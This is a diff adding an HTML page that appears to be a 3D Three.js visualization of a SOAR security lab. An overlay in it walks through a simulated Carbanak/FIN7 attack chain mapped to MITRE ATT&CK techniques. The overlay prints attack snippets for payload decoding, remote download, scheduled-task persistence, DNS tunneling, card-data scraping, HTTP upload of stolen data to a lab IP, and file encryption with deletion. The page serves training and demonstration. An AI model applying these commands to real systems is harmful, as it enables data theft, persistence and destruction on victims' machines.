@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Lab SOAR 3D — Security Operations</title>
+<style>
+  /* FORCING TIMES NEW ROMAN EVERYWHERE */
+  * { 
+    margin: 0; padding: 0; box-sizing: border-box; 
+    font-family: 'Times New Roman', Times, serif !important;
+  }
+  
+  body {
+    background-color: #010205; /* Nền tối sâu thẳm */
+    overflow: hidden;
+    color: #e6edf3;
+  }
+
+  /* Viền tối Vignette bao quanh màn hình */
+  body::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    box-shadow: inset 0 0 150px rgba(0,0,0,0.95);
+    pointer-events: none;
+    z-index: 10; 
+  }
+
+  #canvas-container { width: 100vw; height: 100vh; position: relative; z-index: 1; }
+  canvas { display: block; }
+
+  /* CSS2D Labels */
+  .node-label {
+    background: rgba(5, 10, 20, 0.85);
+    border: 1px solid rgba(88,166,255,0.4);
+    border-radius: 6px;
+    padding: 8px 14px;
+    font-size: 13px;
+    line-height: 1.6;
+    pointer-events: none;
+    white-space: pre;
+    text-shadow: 0 0 10px currentColor;
+    backdrop-filter: blur(6px);
+    transition: opacity 0.4s ease;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+  }
+  .label-attacker  { color: #ff4d4d; border-color: rgba(255,77,77,0.7); box-shadow: 0 0 20px rgba(255,77,77,0.3); }
+  .label-firewall  { color: #ffaa00; border-color: rgba(255,170,0,0.7); box-shadow: 0 0 20px rgba(255,170,0,0.3); }
+  .label-ubuntu    { color: #00ff88; border-color: rgba(0,255,136,0.7); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
+  .label-endpoint  { color: #00aaff; border-color: rgba(0,170,255,0.7); box-shadow: 0 0 20px rgba(0,170,255,0.3); }
+
+  /* Pulse animation cho chấm HUD */
+  @keyframes pulseGlow {
+    0%   { box-shadow: 0 0 5px currentColor; transform: scale(1); }
+    50%  { box-shadow: 0 0 15px currentColor, 0 0 5px white; transform: scale(1.15); }
+    100% { box-shadow: 0 0 5px currentColor; transform: scale(1); }
+  }
+
+  /* HUD */
+  #hud {
+    position: fixed;
+    top: 25px; left: 25px;
+    background: linear-gradient(135deg, rgba(10,15,25,0.92), rgba(2,4,8,0.97));
+    border: 1px solid rgba(88,166,255,0.2);
+    border-radius: 12px;
+    padding: 18px 24px;
+    font-size: 13px;
+    line-height: 1.8;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 12px 40px rgba(0,0,0,0.8), inset 0 0 10px rgba(255,255,255,0.02);
+    max-width: 290px;
+    z-index: 20;
+  }
+  #hud h2 { color:#58a6ff; font-size:16px; margin-bottom:12px; letter-spacing:1px; text-transform: uppercase; text-shadow: 0 0 12px rgba(88,166,255,0.6); }
+  #hud .dot { 
+    display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:10px; 
+    animation: pulseGlow 2s infinite ease-in-out;
+  }
+  #hud .red   { background:#ff4d4d; color: #ff4d4d; }
+  #hud .cyan  { background:#00aaff; color: #00aaff; }
+  #hud .orange{ background:#ffaa00; color: #ffaa00; }
+  #hud .green { background:#00ff88; color: #00ff88; }
+  
+  #tip {
+    position: fixed;
+    bottom: 30px; left: 50%; transform: translateX(-50%);
+    background: linear-gradient(90deg, rgba(10,15,25,0.85), rgba(20,30,45,0.95), rgba(10,15,25,0.85));
+    border: 1px solid rgba(139, 148, 158, 0.4);
+    border-radius: 30px;
+    padding: 12px 30px;
+    font-size: 14px;
+    color: #e6edf3;
+    backdrop-filter: blur(12px);
+    letter-spacing: 0.5px;
+    transition: opacity .5s, transform 0.3s;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.6);
+    font-weight: bold;
+    z-index: 20;
+  }
+
+  /* ── ATTACK CHAIN OVERLAY ── */
+  #attack-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,2,5,0.0);
+    backdrop-filter: blur(0px);
+    z-index: 100;
+    display: flex; align-items: center; justify-content: center;
+    pointer-events: none;
+    transition: background 0.6s ease, backdrop-filter 0.6s ease;
+  }
+  #attack-overlay.active {
+    background: radial-gradient(circle at center, rgba(5,8,15,0.88) 0%, rgba(1,2,4,0.98) 100%);
+    backdrop-filter: blur(15px);
+    pointer-events: all;
+  }
+  #attack-panel {
+    width: min(1150px, 95vw);
+    background: linear-gradient(145deg, rgba(15,22,35,0.96), rgba(5,8,12,0.99));
+    border: 1px solid rgba(255, 77, 77, 0.5);
+    border-radius: 18px;
+    padding: 40px 45px;
+    position: relative;
+    opacity: 0;
+    transform: scale(0.9) translateY(30px);
+    transition: opacity 0.5s cubic-bezier(0.16, 1, 0.3, 1), transform 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+    max-height: 90vh;
+    overflow-y: auto;
+    box-shadow: 0 25px 70px rgba(0,0,0,0.9), inset 0 0 25px rgba(255,77,77,0.08);
+  }
+  #attack-overlay.active #attack-panel {
+    opacity: 1;
+    transform: scale(1) translateY(0);
+  }
+  #attack-panel h2 {
+    color: #ff4d4d;
+    font-size: 24px;
+    letter-spacing: 2.5px;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    text-shadow: 0 0 20px rgba(255,77,77,0.7);
+    font-weight: bold;
+  }
+  #attack-panel .subtitle {
+    color: #a1a9b3; font-size: 13px; letter-spacing: 2px; margin-bottom: 30px; text-transform: uppercase; font-weight: bold;
+  }
+  #btn-close {
+    position: absolute; top: 25px; right: 25px;
+    background: rgba(255,255,255,0.05); border: 1px solid #444c56; border-radius: 8px;
+    color: #c9d1d9; font-size: 13px; padding: 8px 16px; cursor: pointer;
+    transition: all .3s; font-weight: bold; letter-spacing: 1px;
+  }
+  #btn-close:hover { background: rgba(255,77,77,0.15); border-color: #ff4d4d; color: #ff4d4d; box-shadow: 0 0 20px rgba(255,77,77,0.4); transform: translateY(-2px); }
+
+  /* Chain nodes */
+  .chain-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 20px;
+    margin-bottom: 35px;
+  }
+  @media (max-width: 900px) {
+    .chain-grid { grid-template-columns: repeat(2, 1fr); }
+  }
+  .chain-node {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 20px;
+    cursor: pointer;
+    transition: all .4s cubic-bezier(0.16, 1, 0.3, 1);
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+  }
+  .chain-node::before {
+    content: '';
+    position: absolute; top:0; left:0; right:0; height:3px;
+    background: var(--accent);
+    opacity: 0.6;
+    transition: opacity .4s, height .4s;
+    box-shadow: 0 0 10px var(--accent-glow);
+  }
+  .chain-node:hover {
+    border-color: var(--accent);
+    background: linear-gradient(180deg, rgba(255,255,255,0.08) 0%, rgba(255,255,255,0.02) 100%);
+    transform: translateY(-6px);
+    box-shadow: 0 15px 35px rgba(0,0,0,0.6), 0 0 20px var(--accent-glow);
+  }
+  .chain-node:hover::before { opacity: 1; height: 5px; }
+  .chain-node .tag {
+    font-size: 11px; letter-spacing: 1.5px;
+    color: var(--accent); margin-bottom: 10px;
+    text-transform: uppercase; font-weight: bold;
+    text-shadow: 0 0 10px var(--accent-glow);
+  }
+  .chain-node .name {
+    font-size: 17px; color: #ffffff; font-weight: bold;
+    margin-bottom: 8px; letter-spacing: 0.5px;
+  }
+  .chain-node .desc {
+    font-size: 14px; color: #a1a9b3; line-height: 1.5; margin-bottom: 12px;
+  }
+  .chain-node .ioc {
+    margin-top: 6px; font-size: 12px;
+    color: #79c0ff; opacity: 0.9; font-weight: bold;
+    background: rgba(121, 192, 255, 0.12);
+    padding: 4px 8px; border-radius: 5px;
+    display: inline-block; word-break: break-all;
+    border: 1px solid rgba(121, 192, 255, 0.2);
+  }
+
+  /* Full chain button */
+  #btn-fullchain {
+    display: block; width: 100%; padding: 18px;
+    background: linear-gradient(90deg, rgba(255,77,77,0.05), rgba(255,77,77,0.18), rgba(255,77,77,0.05));
+    border: 1px solid rgba(255,77,77,0.5);
+    border-radius: 12px;
+    color: #ff4d4d; font-size: 16px; letter-spacing: 2px; cursor: pointer;
+    transition: all .4s;
+    text-align: center; text-transform: uppercase; font-weight: bold;
+  }
+  #btn-fullchain:hover {
+    background: linear-gradient(90deg, rgba(255,77,77,0.1), rgba(255,77,77,0.3), rgba(255,77,77,0.1));
+    border-color: #ff4d4d;
+    text-shadow: 0 0 12px #ff4d4d;
+    box-shadow: 0 0 25px rgba(255,77,77,0.3);
+    transform: translateY(-2px);
+  }
+
+  /* ── FULL CHAIN VIEW ── */
+  #fullchain-panel {
+    display: none;
+    padding: 25px 0 10px;
+  }
+  #fullchain-panel.visible { display: block; animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+  
+  .fc-title {
+    color: #ffaa00; font-size: 16px; letter-spacing: 2px; text-transform: uppercase;
+    margin: 15px 0 25px; border-left: 4px solid #ffaa00;
+    padding-left: 15px; font-weight: bold; text-shadow: 0 0 10px rgba(255,170,0,0.5);
+  }
+  .fc-step {
+    display: flex; gap: 20px;
+    margin-bottom: 18px; align-items: stretch;
+    background: rgba(255,255,255,0.03);
+    padding: 20px; border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.06);
+    box-shadow: inset 0 0 20px rgba(0,0,0,0.2);
+    transition: all 0.3s;
+  }
+  .fc-step:hover {
+    background: rgba(255,255,255,0.05);
+    border-color: rgba(255,170,0,0.3);
+    box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+  }
+  .fc-step-num {
+    width: 36px; height: 36px; border-radius: 50%;
+    background: linear-gradient(135deg, rgba(255,170,0,0.25), rgba(255,77,77,0.25));
+    border: 2px solid rgba(255,170,0,0.6);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 17px; font-weight: bold; color: #ffaa00; flex-shrink: 0;
+    box-shadow: 0 0 12px rgba(255,170,0,0.4);
+  }
+  .fc-step-body { flex: 1; }
+  .fc-step-title { font-size: 17px; color: #ffffff; margin-bottom: 8px; font-weight: bold; }
+  .fc-step-detail { font-size: 15px; color: #a1a9b3; line-height: 1.6; }
+  .fc-step-code {
+    margin-top: 12px; padding: 12px 18px;
+    background: rgba(0,0,0,0.6);
+    border-radius: 8px; border-left: 4px solid #58a6ff;
+    font-size: 14px; color: #79c0ff;
+    word-break: break-all; line-height: 1.6; font-weight: bold;
+    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+  }
+  .arrow-down {
+    text-align: center; color: #444c56; font-size: 24px;
+    margin: -5px 0 12px; user-select: none;
+  }
+  
+  /* scrollbar */
+  #attack-panel::-webkit-scrollbar { width: 8px; }
+  #attack-panel::-webkit-scrollbar-track { background: transparent; }
+  #attack-panel::-webkit-scrollbar-thumb { background: #444c56; border-radius: 4px; }
+  #attack-panel::-webkit-scrollbar-thumb:hover { background: #ff4d4d; }
+</style>
+</head>
+<body>
+<div id="canvas-container"></div>
+
+<div id="hud">
+  <h2>◈ LAB SOAR 3D</h2>
+  <div><span class="dot red"></span>Kali Linux — Attacker</div>
+  <div><span class="dot orange"></span>pfSense Firewall</div>
+  <div><span class="dot green"></span>Ubuntu SOAR Stack</div>
+  <div><span class="dot cyan"></span>Windows 11 — Endpoint</div>
+  <br/>
+  <div style="color:#a1a9b3; font-size:12px; margin-top:5px;">🖱 Left Click: Rotate | Right Click: Pan</div>
+  <div style="color:#a1a9b3; font-size:12px;">⌨ WASD: Pan | Q/E: Up/Down</div>
+  <div style="color:#a1a9b3; font-size:12px;">🖱 Scroll: Zoom</div>
+</div>
+<div id="tip">🖱 CLICK UBUNTU TO VIEW STACK | CLICK KALI TO VIEW ATTACK CHAIN SUMMARY</div>
+
+<div id="attack-overlay">
+  <div id="attack-panel">
+    <button id="btn-close" onclick="closeAttackPanel()">✕ CLOSE</button>
+    <h2>◈ CARBANAK / FIN7 ATTACK CHAIN</h2>
+    <div class="subtitle">MITRE ATT&amp;CK — DETAILED 8-STEP PROCESS (LAB SIMULATION)</div>
+
+    <div class="chain-grid">
+      <!-- STEP 1 -->
+      <div class="chain-node" style="--accent:#8e44ad; --accent-glow:rgba(142,68,173,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 1 · RECONNAISSANCE</div>
+        <div class="name">Recon & Setup</div>
+        <div class="desc">Gather POS system info, establish shell company 'Slazzer LLC', register fake domains.</div>
+        <div class="ioc">T1591 · T1583.001</div>
+      </div>
+      <!-- STEP 2 -->
+      <div class="chain-node" style="--accent:#3498db; --accent-glow:rgba(52,152,219,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 2 · INITIAL ACCESS</div>
+        <div class="name">Spearphishing Email</div>
+        <div class="desc">Send targeted email (e.g., 'Payment overdue.eml') with malicious DOCX attachment.</div>
+        <div class="ioc">T1566.001</div>
+      </div>
+      <!-- STEP 3 -->
+      <div class="chain-node" style="--accent:#e67e22; --accent-glow:rgba(230,126,34,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 3 · EXECUTION</div>
+        <div class="name">BATELEUR Dropper</div>
+        <div class="desc">Victim opens DOCX, triggers VBA macro. wscript.exe runs dropper, PowerShell decodes base64.</div>
+        <div class="ioc">T1204.002 · T1059.005</div>
+      </div>
+      <!-- STEP 4 -->
+      <div class="chain-node" style="--accent:#2ecc71; --accent-glow:rgba(46,204,113,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 4 · C2 & TOOL TRANSFER</div>
+        <div class="name">Carbanak Loader</div>
+        <div class="desc">Dropper downloads debug.txt from C2, converts to debug.log. Proceeds to download main payload update.exe.</div>
+        <div class="ioc">T1071.001 · T1105</div>
+      </div>
+      <!-- STEP 5 -->
+      <div class="chain-node" style="--accent:#f1c40f; --accent-glow:rgba(241,196,15,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 5 · PERSISTENCE</div>
+        <div class="name">Persistence Setup</div>
+        <div class="desc">Create Scheduled Task 'WindowsUpdateDebug' and install Application Shimming (.sdb) for stealth.</div>
+        <div class="ioc">T1053.005 · T1546.011</div>
+      </div>
+      <!-- STEP 6 -->
+      <div class="chain-node" style="--accent:#1abc9c; --accent-glow:rgba(26,188,156,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 6 · COLLECTION</div>
+        <div class="name">RAM Scraping & Keylog</div>
+        <div class="desc">Scrape RAM for Track 1/2 credit card data. Download keylogger/screencap modules via DNS Tunneling.</div>
+        <div class="ioc">T1005 · T1071.004</div>
+      </div>
+      <!-- STEP 7 -->
+      <div class="chain-node" style="--accent:#e74c3c; --accent-glow:rgba(231,76,60,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 7 · EXFILTRATION</div>
+        <div class="name">HTTP Exfiltration</div>
+        <div class="desc">Compress stolen data into a ZIP file and exfiltrate via HTTP POST to upload.php.</div>
+        <div class="ioc">T1560 · T1048.003</div>
+      </div>
+      <!-- STEP 8 -->
+      <div class="chain-node" style="--accent:#9b59b6; --accent-glow:rgba(155,89,182,0.5)" onclick="jumpFullChain()">
+        <div class="tag">STAGE 8 · IMPACT</div>
+        <div class="name">Ransomware Impact</div>
+        <div class="desc">Custom Ransomware function encrypts files using AES-CBC, renames to .aes, and deletes originals.</div>
+        <div class="ioc">T1486</div>
+      </div>
+    </div>
+
+    <button id="btn-fullchain" onclick="toggleFullChain()">▶ VIEW DETAILED TECHNICAL STEPS</button>
+
+    <div id="fullchain-panel">
+      <div class="fc-title">DETAILED 8-STEP CHAIN ANALYSIS</div>
+      
+      <div class="fc-step">
+        <div class="fc-step-num">1</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Reconnaissance and Preparation</div>
+          <div class="fc-step-detail">Attacker gathers victim info and POS payment procedures. FIN7 registers fake domains and establishes shell company 'Slazzer LLC' to create legitimate-looking phishing emails.</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+      
+      <div class="fc-step">
+        <div class="fc-step-num">2</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Initial Access</div>
+          <div class="fc-step-detail">Send targeted spearphishing emails to employees with malicious DOCX attachments, often disguised as overdue payment invoices.</div>
+          <div class="fc-step-code">Attachment: Payment overdue.eml, 1-list.docx</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">3</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Execution</div>
+          <div class="fc-step-detail">Victim opens DOCX, tricked into enabling macros. BATELEUR loader is executed by wscript.exe. PowerShell runs hidden with -NoProfile flag to decode the Payload.</div>
+          <div class="fc-step-code">powershell -NoProfile -c "$b=Get-Content '%INFILE%';[IO.File]::WriteAllBytes('%OUTFILE%',[Convert]::FromBase64String($b))"</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">4</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">C2 Communication & Tool Transfer</div>
+          <div class="fc-step-detail">HTTP connection retrieves encoded malware (debug.txt) converted to JScript (debug.log). JScript calls ADODB.Stream to download Carbanak binary (update.exe).</div>
+          <div class="fc-step-code">http.open("GET", url, false);
+stream.Write(http.responseBody); stream.SaveToFile(outPath, 2);</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">5</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Persistence</div>
+          <div class="fc-step-detail">Registers Scheduled Task 'WindowsUpdateDebug' to run script on logon. Carbanak uses sdbinst.exe to install Shim database (.sdb) for evasion.</div>
+          <div class="fc-step-code">schtasks /create /f /sc onlogon /tn "WindowsUpdateDebug" /tr "wscript.exe //e:jscript debug.log"</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">6</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Collection</div>
+          <div class="fc-step-detail">Malware scans POS process RAM (ReadProcessMemory) for payment card structures (Track 1/2). C# Keylogger and screencapture modules are loaded directly into RAM via DNS Tunneling (TXT records).</div>
+          <div class="fc-step-code">Resolve-DnsName -Name $domain -Type TXT -Server $SLINGSHOT_IP
+Regex pattern = new Regex(@"%B\d{1,19}\^[A-Za-z\s/]{2,26}\^\d{4}.*\?");</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">7</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Exfiltration</div>
+          <div class="fc-step-detail">Compress all logs, screenshots, and RAM data into a session-specific ZIP file. Send all data via HTTP POST to attacker's upload.php script.</div>
+          <div class="fc-step-code">$webClient = New-Object System.Net.WebClient
+$response = $webClient.UploadFile("http://10.10.20.10/upload.php", "POST", $zip)</div>
+        </div>
+      </div>
+      <div class="arrow-down">↓</div>
+
+      <div class="fc-step">
+        <div class="fc-step-num">8</div>
+        <div class="fc-step-body">
+          <div class="fc-step-title">Data Encryption / Ransomware (Impact)</div>
+          <div class="fc-step-detail">Uses Cryptography.Aes to encrypt critical files with AES-CBC algorithm. Files renamed to .aes. Remove-Item -Force command deletes original files to prevent recovery.</div>
+          <div class="fc-step-code">$Aes = [System.Security.Cryptography.Aes]::Create()
+$Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+Remove-Item -Path $Path -Force</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/loaders/GLTFLoader.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/renderers/CSS2DRenderer.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tween.js/18.6.4/tween.umd.js"></script>
+
+<script>
+'use strict';
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ ATTACK PANEL LOGIC
+   ══════════════════════════════════════════════════════════════════ */
+let attackPanelOpen = false;
+let fullChainOpen = false;
+
+function openAttackPanel() {
+  document.getElementById('attack-overlay').classList.add('active');
+  attackPanelOpen = true;
+  document.getElementById('tip').textContent = '✕ CLICK CLOSE BUTTON OR PRESS ESC TO EXIT';
+}
+function closeAttackPanel() {
+  document.getElementById('attack-overlay').classList.remove('active');
+  attackPanelOpen = false;
+  document.getElementById('tip').textContent = '🖱 CLICK UBUNTU TO VIEW STACK | CLICK KALI TO VIEW ATTACK CHAIN SUMMARY';
+}
+function toggleFullChain() {
+  fullChainOpen = !fullChainOpen;
+  const panel = document.getElementById('fullchain-panel');
+  const btn = document.getElementById('btn-fullchain');
+  panel.classList.toggle('visible', fullChainOpen);
+  btn.textContent = fullChainOpen ? '▼ HIDE DETAILS' : '▶ VIEW DETAILED TECHNICAL STEPS';
+}
+function jumpFullChain() {
+  if (!fullChainOpen) toggleFullChain();
+  setTimeout(() => {
+    document.getElementById('fullchain-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }, 100);
+}
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && attackPanelOpen) closeAttackPanel();
+});
+document.getElementById('attack-overlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('attack-overlay')) closeAttackPanel();
+});
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ MODEL URL CONSTANTS
+   ══════════════════════════════════════════════════════════════════ */
+const KALI_MODEL_URL    = './models/laptop.glb';
+const WIN11_MODEL_URL   = './models/laptop.glb';
+const PFSENSE_MODEL_URL = './models/server_rack.glb';
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ SCENE BOOTSTRAP
+   ══════════════════════════════════════════════════════════════════ */
+const container = document.getElementById('canvas-container');
+const W = window.innerWidth, H = window.innerHeight;
+
+const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+renderer.setSize(W, H);
+renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+renderer.shadowMap.enabled = true;
+renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+renderer.toneMapping = THREE.ACESFilmicToneMapping;
+renderer.toneMappingExposure = 1.0;
+renderer.setClearColor(0x000000, 0); // Transparent for CSS background
+container.appendChild(renderer.domElement);
+
+const labelRenderer = new THREE.CSS2DRenderer();
+labelRenderer.setSize(W, H);
+labelRenderer.domElement.style.position = 'absolute';
+labelRenderer.domElement.style.top = '0';
+labelRenderer.domElement.style.pointerEvents = 'none';
+container.appendChild(labelRenderer.domElement);
+
+const scene = new THREE.Scene();
+scene.fog = new THREE.FogExp2(0x010205, 0.012);
+
+const camera = new THREE.PerspectiveCamera(50, W / H, 0.1, 300);
+camera.position.set(0, 16, 35);
+
+const controls = new THREE.OrbitControls(camera, renderer.domElement);
+controls.enableDamping = true;
+controls.dampingFactor = 0.07;
+controls.minDistance = 2;
+controls.maxDistance = 100;
+controls.maxPolarAngle = Math.PI;
+controls.minPolarAngle = 0;
+controls.enablePan = true;
+controls.panSpeed = 1.2;
+controls.screenSpacePanning = true;
+controls.mouseButtons = { LEFT: THREE.MOUSE.ROTATE, MIDDLE: THREE.MOUSE.DOLLY, RIGHT: THREE.MOUSE.PAN };
+controls.target.set(0, 1, 0);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ LIGHTING 
+   ══════════════════════════════════════════════════════════════════ */
+scene.add(new THREE.AmbientLight(0x1a1a2e, 2.5));
+const dirLight = new THREE.DirectionalLight(0x8bacc8, 1.0);
+dirLight.position.set(5, 12, 8);
+dirLight.castShadow = true;
+dirLight.shadow.mapSize.set(2048, 2048);
+scene.add(dirLight);
+
+const kaliLight   = new THREE.PointLight(0xff2233, 5, 12);
+kaliLight.position.set(-15, 2, 0);
+scene.add(kaliLight);
+
+const win11Light  = new THREE.PointLight(0x00aaff, 5, 12);
+win11Light.position.set(15, 2, 0);
+scene.add(win11Light);
+
+const pfLight     = new THREE.PointLight(0xff6600, 4, 10);
+pfLight.position.set(-5, 2, 0);
+scene.add(pfLight);
+
+const ubuntuLight = new THREE.PointLight(0x00ff88, 4, 10);
+ubuntuLight.position.set(5, 2, 0);
+scene.add(ubuntuLight);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ 3D BLOBS & BUBBLES BACKGROUND (LOANG MÀU XÁM VÀNG & BONG BÓNG TO)
+   ══════════════════════════════════════════════════════════════════ */
+
+// 1. Blob Texture (Soft Radial Gradient)
+function createBlobTexture() {
+  const canvas = document.createElement('canvas');
+  canvas.width = 128; canvas.height = 128;
+  const ctx = canvas.getContext('2d');
+  const grad = ctx.createRadialGradient(64, 64, 0, 64, 64, 64);
+  grad.addColorStop(0, 'rgba(255, 255, 255, 1)');
+  grad.addColorStop(0.3, 'rgba(255, 255, 255, 0.6)');
+  grad.addColorStop(1, 'rgba(255, 255, 255, 0)');
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, 128, 128);
+  return new THREE.CanvasTexture(canvas);
+}
+
+// 2. Bubble Texture (Ring shape)
+function createBubbleTexture() {
+  const canvas = document.createElement('canvas');
+  canvas.width = 64; canvas.height = 64;
+  const ctx = canvas.getContext('2d');
+  const grad = ctx.createRadialGradient(32, 32, 10, 32, 32, 30);
+  grad.addColorStop(0, 'rgba(255,255,255,0)');
+  grad.addColorStop(0.8, 'rgba(255,255,255,0.8)');
+  grad.addColorStop(1, 'rgba(255,255,255,0)');
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, 64, 64);
+  return new THREE.CanvasTexture(canvas);
+}
+
+const blobTex = createBlobTexture();
+const bubTex = createBubbleTexture();
+
+// -- SYSTEM: BLOBS (Loang màu XÁM VÀNG) --
+const blobCount = 25;
+const blobGeo = new THREE.BufferGeometry();
+const bPos = new Float32Array(blobCount * 3);
+const bCol = new Float32Array(blobCount * 3);
+const bBaseCol = [];
+const bPhase = [];
+
+// Palette màu Xám (Gray) và Vàng (Yellow)
+const palette = [
+  new THREE.Color(0xaaaaaa), // Light Gray
+  new THREE.Color(0xffcc00), // Yellow
+  new THREE.Color(0x777777), // Medium Gray
+  new THREE.Color(0xffea00)  // Bright Yellow
+];
+
+for(let i=0; i<blobCount; i++) {
+    bPos[i*3+0] = (Math.random() - 0.5) * 150;
+    bPos[i*3+1] = (Math.random() - 0.5) * 100 + 10;
+    bPos[i*3+2] = (Math.random() - 0.5) * 60 - 40; // Đẩy ra sau
+    
+    const col = palette[Math.floor(Math.random() * palette.length)];
+    bBaseCol.push(col.r, col.g, col.b);
+    bCol[i*3+0] = col.r; bCol[i*3+1] = col.g; bCol[i*3+2] = col.b;
+    bPhase.push(Math.random() * Math.PI * 2);
+}
+blobGeo.setAttribute('position', new THREE.BufferAttribute(bPos, 3));
+blobGeo.setAttribute('color', new THREE.BufferAttribute(bCol, 3));
+const blobMat = new THREE.PointsMaterial({
+    size: 80, map: blobTex, transparent: true, opacity: 0.6, depthWrite: false, vertexColors: true, blending: THREE.AdditiveBlending
+});
+const blobPoints = new THREE.Points(blobGeo, blobMat);
+scene.add(blobPoints);
+
+// -- SYSTEM: BUBBLES (Bong bóng to Xám Vàng) --
+const bubCount = 200;
+const bubGeo = new THREE.BufferGeometry();
+const bubPos = new Float32Array(bubCount * 3);
+const bubCol = new Float32Array(bubCount * 3);
+const bubBaseCol = [];
+const bubPhase = [];
+const bubSpeed = [];
+
+for(let i=0; i<bubCount; i++) {
+    bubPos[i*3+0] = (Math.random() - 0.5) * 150;
+    bubPos[i*3+1] = (Math.random() - 0.5) * 100;
+    bubPos[i*3+2] = (Math.random() - 0.5) * 80 - 20;
+    
+    const isYellow = Math.random() > 0.5;
+    const col = isYellow ? new THREE.Color(0xffcc00) : new THREE.Color(0xcccccc);
+    bubBaseCol.push(col.r, col.g, col.b);
+    bubCol[i*3+0] = col.r; bubCol[i*3+1] = col.g; bubCol[i*3+2] = col.b;
+    
+    bubPhase.push(Math.random() * Math.PI * 2);
+    bubSpeed.push(0.015 + Math.random() * 0.03); // Tốc độ trôi lên
+}
+bubGeo.setAttribute('position', new THREE.BufferAttribute(bubPos, 3));
+bubGeo.setAttribute('color', new THREE.BufferAttribute(bubCol, 3));
+const bubMat = new THREE.PointsMaterial({
+    size: 12.0, // TĂNG KÍCH THƯỚC BONG BÓNG TO LÊN
+    map: bubTex, transparent: true, opacity: 0.8, depthWrite: false, vertexColors: true, blending: THREE.AdditiveBlending
+});
+const bubPoints = new THREE.Points(bubGeo, bubMat);
+scene.add(bubPoints);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ HELPERS + LABEL REGISTRY
+   ══════════════════════════════════════════════════════════════════ */
+const ALL_LABELS = [];
+
+function makeLabel(html, className) {
+  const div = document.createElement('div');
+  div.className = `node-label ${className}`;
+  div.innerHTML = html;
+  const obj = new THREE.CSS2DObject(div);
+  ALL_LABELS.push({ div, obj, basePx: 13 });
+  return obj;
+}
+
+const _tmpWorld = new THREE.Vector3();
+function scaleAllLabels() {
+  const REF = 35;
+  for (const L of ALL_LABELS) {
+    L.obj.getWorldPosition(_tmpWorld);
+    const dist = camera.position.distanceTo(_tmpWorld);
+    const s = Math.max(0.45, Math.min(3.8, REF / Math.max(dist, 1)));
+    L.div.style.fontSize = Math.round(L.basePx * s) + 'px';
+  }
+}
+
+function makeFallbackLaptop(color) {
+  const g = new THREE.Group();
+  const baseMat = new THREE.MeshStandardMaterial({ color, roughness:0.3, metalness:0.8, emissive: color, emissiveIntensity:0.15 });
+  const base = new THREE.Mesh(new THREE.BoxGeometry(1.6, 0.08, 1.1), baseMat);
